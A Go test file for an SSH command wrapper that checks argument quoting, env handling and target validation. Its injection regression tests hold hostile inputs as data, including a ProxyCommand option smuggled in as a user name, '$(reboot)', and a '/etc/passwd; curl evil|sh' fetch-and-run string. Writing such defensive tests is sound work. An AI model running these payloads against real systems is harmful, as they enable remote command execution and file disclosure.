package exec

import (
	"strings"
	"testing"
)

func TestSSH_ArgvAssembly(t *testing.T) {
	s := SSH{Host: "h", User: "u", Port: 2222, IdentityFile: "/k"}
	got := s.sshArgv(Spec{Argv: []string{"docker", "logs", "-f", "c1"}})
	joined := strings.Join(got, " ")
	for _, want := range []string{"ssh", "-i /k", "-p 2222", "-o BatchMode=yes", "u@h"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("argv %q missing %q", joined, want)
		}
	}
	// The remote command is a SINGLE, shell-quoted trailing argv element.
	if last := got[len(got)-1]; last != `'docker' 'logs' '-f' 'c1'` {
		t.Fatalf("remote command not quoted as one arg: %q", last)
	}
}

// No literal "--" is emitted: pre-8.5 ssh clients pass it to the remote shell
// as a bogus first word. The remote command is always single-quoted, so it
// can't be misparsed as an ssh option without it.
func TestSSH_NoDoubleDashSeparator(t *testing.T) {
	got := SSH{Host: "h", User: "u"}.sshArgv(Spec{Argv: []string{"tail", "f"}})
	for _, a := range got {
		if a == "--" {
			t.Fatalf("argv must not contain a literal --: %v", got)
		}
	}
}

// Env is applied to the REMOTE command (via an `env` prefix), matching
// Local.Run's Env semantics — it must not be handed to the local ssh client.
func TestSSH_EnvFoldedIntoRemoteCommand(t *testing.T) {
	got := SSH{Host: "h", User: "u"}.sshArgv(Spec{
		Argv: []string{"kubectl", "logs", "p"},
		Env:  []string{"KUBECONFIG=/tmp/k b"},
	})
	remote := got[len(got)-1]
	want := `env 'KUBECONFIG=/tmp/k b' 'kubectl' 'logs' 'p'`
	if remote != want {
		t.Fatalf("remote command = %q, want %q", remote, want)
	}
}

func TestSSH_ValidateRejectsHostileTarget(t *testing.T) {
	for _, s := range []SSH{
		{Host: "h", User: "-oProxyCommand=touch pwned"},
		{Host: "evil@h", User: "u"},
		{Host: "-x", User: "u"},
	} {
		if err := s.validate(); err == nil {
			t.Fatalf("expected validate() to reject %+v", s)
		}
	}
	if err := (SSH{Host: "h", User: "u"}).validate(); err != nil {
		t.Fatalf("plain host/user must pass: %v", err)
	}
}

func TestSSH_NoIdentityOmitsFlag(t *testing.T) {
	got := SSH{Host: "h", User: "u"}.sshArgv(Spec{Argv: []string{"tail", "f"}})
	if strings.Contains(strings.Join(got, " "), "-i ") {
		t.Fatal("no identity -> no -i flag")
	}
}

// TestSSH_QuotesBlockRemoteInjection is the regression test for the remote
// command-injection defect: shell metacharacters in pass-through args must stay
// inside a single quoted token, never reaching the remote shell as syntax.
func TestSSH_QuotesBlockRemoteInjection(t *testing.T) {
	// Hardcoded expected remote command strings (NOT compared to shellQuoteArgs,
	// which would be tautological) — these are exactly what a remote `sh -c` must
	// receive for the metacharacters to stay literal data.
	cases := []struct {
		argv []string
		want string
	}{
		{[]string{"docker", "logs", "c1; id"}, `'docker' 'logs' 'c1; id'`},
		{[]string{"tail", "-n", "200 /etc/passwd; curl evil|sh"}, `'tail' '-n' '200 /etc/passwd; curl evil|sh'`},
		{[]string{"docker", "logs", "$(reboot)"}, `'docker' 'logs' '$(reboot)'`},
		{[]string{"tail", "-f", "a'b"}, `'tail' '-f' 'a'\''b'`}, // embedded single quote → '\''
	}
	for _, tc := range cases {
		got := SSH{Host: "h", User: "u"}.sshArgv(Spec{Argv: tc.argv})
		remote := got[len(got)-1] // the single trailing command string
		if remote != tc.want {
			t.Fatalf("argv %v\n got remote %q\nwant remote %q", tc.argv, remote, tc.want)
		}
		// Belt-and-suspenders: every dangerous metachar must live inside a
		// single-quoted span (odd number of quotes precedes it), so the shell
		// treats it as literal data rather than syntax.
		for _, bad := range []string{";", "|", "$(", "&&"} {
			if idx := strings.Index(remote, bad); idx >= 0 {
				if strings.Count(remote[:idx], "'")%2 == 0 {
					t.Fatalf("metachar %q in %q is OUTSIDE quotes (injectable)", bad, remote)
				}
			}
		}
	}
}
